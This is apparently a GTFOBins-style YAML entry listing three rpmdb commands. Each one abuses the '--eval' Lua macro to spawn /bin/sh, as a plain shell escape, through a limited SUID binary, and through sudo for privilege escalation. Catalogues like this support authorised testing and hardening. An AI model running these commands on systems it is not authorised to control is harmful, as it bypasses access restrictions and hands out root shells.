---
functions:
  shell:
    - code: rpmdb --eval '%{lua:posix.exec("/bin/sh")}'
  limited-suid:
    - code: ./rpmdb --eval '%{lua:os.execute("/bin/sh")}'
  sudo:
    - code: sudo rpmdb --eval '%{lua:posix.exec("/bin/sh")}'
---
